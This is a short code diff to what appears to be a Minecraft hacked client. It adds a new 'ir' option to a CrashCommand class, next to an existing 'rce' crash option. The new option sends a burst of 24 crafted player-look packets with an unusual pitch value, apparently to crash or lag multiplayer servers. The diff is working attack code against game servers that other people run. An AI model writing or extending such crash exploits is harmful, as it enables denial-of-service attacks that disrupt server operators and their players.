@@ -10,6 +10,7 @@ import cn.hanabi.utils.game.ChatUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.Packet;
 import net.minecraft.network.play.client.C01PacketChatMessage;
+import net.minecraft.network.play.client.C03PacketPlayer;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -163,6 +164,11 @@ public class CrashCommand extends Command {
                         break;
                     case "rce":
                         crashUtils.rce(amounts);
+                        break;
+                    case "ir":
+                        for (int i = 0; i < 24; i++) {
+                            sendPacket(new C03PacketPlayer.C05PacketPlayerLook(0, (float) 0.3919237719237813132871932671312378908, true));
+                        }
                         break;
                     case "list":
                         ChatUtils.send(Arrays.toString(crashType));
